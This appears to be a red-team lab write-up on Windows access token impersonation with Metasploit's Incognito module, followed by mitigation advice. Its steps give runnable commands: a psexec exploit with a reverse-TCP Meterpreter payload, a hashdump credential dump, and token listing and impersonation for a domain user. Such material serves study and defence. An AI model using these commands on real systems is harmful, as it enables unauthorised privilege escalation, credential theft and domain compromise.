
# Access Token Impersonation

**MITRE ATT&CK:** T1134.001 (Access Token Manipulation: Token Impersonation/Theft)

---

## 1. Objective

Demonstrate privilege escalation through Windows access token impersonation using the Incognito module in Meterpreter.

This attack abuses existing authenticated sessions on a compromised system to assume another user’s security context without knowing their credentials.

---

## 2. Technical Background

### What Is an Access Token?

In Windows, an access token is a security object created during authentication that contains:

* User SID
* Group memberships
* Privileges
* Logon session details

Every process runs under a token.

Instead of re-authenticating each time a user accesses a resource, Windows relies on this token to authorize actions.

---

## 3. Token Types

There are two primary token types relevant to this attack:

### 1️⃣ Delegation Tokens

* Created during interactive logons (RDP, console login)
* Allow full impersonation
* Can be used across network resources

### 2️⃣ Impersonation Tokens

* Used for non-interactive scenarios (network drive, service authentication)
* Limited scope
* May restrict network authentication

Delegation tokens are significantly more powerful.

---

## 4. Attack Prerequisites

* Compromised host
* Meterpreter session
* Local Administrator privileges
* Another user logged into the same system
* Token available in memory

This technique does not require knowing the target user’s password.

---

# 5. Execution Using Metasploit + Incognito

---

## Step 1 — Obtain Meterpreter Session

```bash
msfconsole
use exploit/windows/smb/psexec
set RHOSTS <target_ip>
set SMBDomain <domain>
set SMBUser <username>
set SMBPass <password>
set payload windows/x64/meterpreter/reverse_tcp
set target 2
run
```

---

## Step 2 — Validate Context

Inside Meterpreter:

```bash
getuid
sysinfo
hostname
hashdump
```

Confirm:

* Current user
* Privilege level
* System architecture

---

## Step 3 — Load Incognito Module

```bash
load incognito
```

Verify available commands:

```bash
help
```

---

## Step 4 — Enumerate Available Tokens

```bash
list_tokens -u
```

This displays impersonation and delegation tokens available in memory.

📸 Screenshots:

* `screenshots/token-imp/token-impersonation1.png`
* `screenshots/token-imp/token-impersonation2.png`

---

## Step 5 — Impersonate a Token

```bash
impersonate_token DOMAIN\\username
```

This switches the security context of the Meterpreter session to the selected user.

Verify:

```bash
getuid
```

---

## Step 6 — Spawn Interactive Shell

```bash
shell
```

You now operate under the impersonated user's security context.

📸 Screenshots:

* `screenshots/token-imp/token-impersonation3.png`
* `screenshots/token-imp/token-impersonation4.png`
* `screenshots/token-imp/token-impersonation5.png`
* `screenshots/token-imp/token-impersonation6.png`
* `screenshots/token-imp/token-impersonation7.png`
* `screenshots/token-imp/token-impersonation8.png`
* `screenshots/token-imp/token-impersonation9.png`

---

## 6. What Happened?

* The system already held authentication tokens for multiple users.
* Meterpreter accessed these tokens.
* The session impersonated another user's security context.
* No password cracking required.
* No credential reuse required.

This is privilege escalation via session abuse.

---

## 7. Why This Works

* Windows stores tokens for logged-on users
* Local administrators can manipulate tokens
* Multiple users often log into shared systems (e.g., admin + helpdesk)
* Poor admin tiering practices

If a Domain Admin logs into a workstation:

→ That workstation becomes a privilege escalation target.

---

## 8. Business Impact

If successful, this attack can lead to:

* Escalation from standard user to local admin
* Escalation from local admin to domain admin
* Lateral movement across the network
* Full domain compromise
* Reduced need for password cracking

This is a common real-world red team technique.

---

## 9. Defensive Mitigation

### 1️⃣ Account Tiering Model

* Domain Admins should never log into workstations
* Separate admin accounts for different tiers

---

### 2️⃣ Restrict Local Administrator Access

* Remove domain users from local Administrators group
* Enforce least privilege

---

### 3️⃣ Use Privileged Access Workstations (PAWs)

Admins log into hardened systems only.

---

### 4️⃣ Monitor Token Manipulation

Watch for:

* Abnormal privilege escalation
* Event ID 4672 (Special privileges assigned)
* Suspicious service account logins

---

### 5️⃣ Credential Guard

Prevents credential material exposure in memory.

---

## 10. Skills Demonstrated

* Windows authentication internals
* Token structure understanding
* Meterpreter module usage
* Privilege escalation logic
* Security boundary awareness
* Enterprise mitigation mapping

---
